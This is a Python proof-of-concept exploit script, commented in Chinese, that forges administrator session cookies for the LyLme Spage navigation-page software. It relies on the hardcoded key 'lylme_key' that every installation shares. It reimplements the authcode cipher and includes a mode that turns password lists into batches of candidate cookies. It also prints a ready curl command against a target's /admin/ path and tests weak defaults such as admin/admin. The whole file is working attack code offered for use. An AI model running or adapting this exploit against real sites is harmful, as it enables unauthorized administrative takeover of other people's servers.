#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
六零导航页(LyLme Spage) admin_token 离线伪造 POC
-------------------------------------------------
原理（源码级）：include/common.php 第 4 行 `define('SYS_KEY','lylme_key')` 硬编码 —— 所有安装共用同一密钥；
include/example.com 的鉴权只做一件事：
    $token = authcode($_COOKIE['admin_token'], 'DECODE', SYS_KEY);
    list($user,$sid) = explode("\t", $token);
    $session = md5($conf['admin_user'].$conf['admin_pwd']);
    if ($session == $sid) $islogin = 1;
=> 只要知道后台的 admin_user/admin_pwd（从数据库 lylme_config 表、配置泄露、或弱口令猜解），
   即可完全离线合成一个合法 cookie，无需访问目标登录接口。

用法:
  python lylme_token.py make  <user> <pass>        # 生成 admin_token
  python lylme_token.py brute <user> <passlist>    # 批量生成候选 cookie（每行一个）
  python lylme_token.py decode <token>             # 解密已验证的 token（自检用）
  python lylme_token.py selftest                   # 自校验（编码后能解回）
"""
import hashlib, base64, time, sys

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
SYS_KEY = "lylme_key"


def md5(s):
    return hashlib.md5(s.encode("utf-8", "surrogateescape")).hexdigest() if isinstance(s, str) else hashlib.md5(s).hexdigest()


def _rc4_like(data_bytes, cryptkey):
    key_length = len(cryptkey)
    box = list(range(256))
    rndkey = [ord(cryptkey[i % key_length]) for i in range(256)]
    j = 0
    for i in range(256):
        j = (j + box[i] + rndkey[i]) % 256
        box[i], box[j] = box[j], box[i]
    out = bytearray()
    a = j = 0
    for ch in data_bytes:
        a = (a + 1) % 256
        j = (j + box[a]) % 256
        box[a], box[j] = box[j], box[a]
        out.append(ch ^ (box[(box[a] + box[j]) % 256]))
    return bytes(out)


def authcode_encode(string, key=SYS_KEY, expiry=0):
    ckey_length = 4
    key_md5 = md5(key)
    keya = md5(key_md5[:16])
    keyb = md5(key_md5[16:32])
    keyc = md5(str(time.time() * 1000))[-4:]
    cryptkey = keya + md5(keya + keyc)
    plain = ("%010d" % (expiry + int(time.time()) if expiry else 0)) + md5(string + keyb)[:16] + string
    enc = _rc4_like(plain.encode("latin-1", "ignore"), cryptkey)
    b64 = base64.b64encode(enc).decode()
    return keyc + b64.replace("=", "")


def authcode_decode(string, key=SYS_KEY):
    key_md5 = md5(key)
    keya = md5(key_md5[:16])
    keyb = md5(key_md5[16:32])
    keyc = string[:4]
    cryptkey = keya + md5(keya + keyc)
    body = string[4:]
    body += "=" * (-len(body) % 4)
    try:
        raw = base64.b64decode(body)
    except Exception:
        return None
    res = _rc4_like(raw, cryptkey).decode("latin-1", "ignore")
    if (res[:10] == "0" * 10 or (res[:10].isdigit() and int(res[:10]) - int(time.time()) > 0)) \
       and res[10:26] == md5(res[26:] + keyb)[:16]:
        return res[26:]
    return None


def make_token(user, pwd):
    sid = md5(user + pwd)
    return authcode_encode("%s\t%s" % (user, sid), SYS_KEY)


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        return
    cmd = sys.argv[1]
    if cmd == "make" and len(sys.argv) >= 4:
        u, p = sys.argv[2], sys.argv[3]
        t = make_token(u, p)
        print("user=%s pass=%s sid=%s" % (u, p, md5(u + p)))
        print("admin_token=%s" % t)
        print("curl -H 'Cookie: admin_token=%s' http://TARGET/admin/" % t)
        print("解密自检:", authcode_decode(t))
    elif cmd == "brute" and len(sys.argv) >= 3:
        u = sys.argv[2]
        words = sys.stdin.read().split() if len(sys.argv) < 4 else sys.argv[3].split(",")
        for p in words:
            print("%s\t%s\t%s" % (u, p, make_token(u, p)))
    elif cmd == "decode" and len(sys.argv) >= 3:
        print(repr(authcode_decode(sys.argv[2])))
    elif cmd == "selftest":
        for u, p in [("admin", "admin"), ("admin", "123456"), ("lylme", "lylme")]:
            t = make_token(u, p)
            d = authcode_decode(t)
            print("%s/%s -> %s  decode=%r  %s" % (u, p, t, d, "OK" if d == ("%s\t%s" % (u, md5(u + p))) else "MISMATCH"))
    else:
        print(__doc__)


if __name__ == "__main__":
    main()
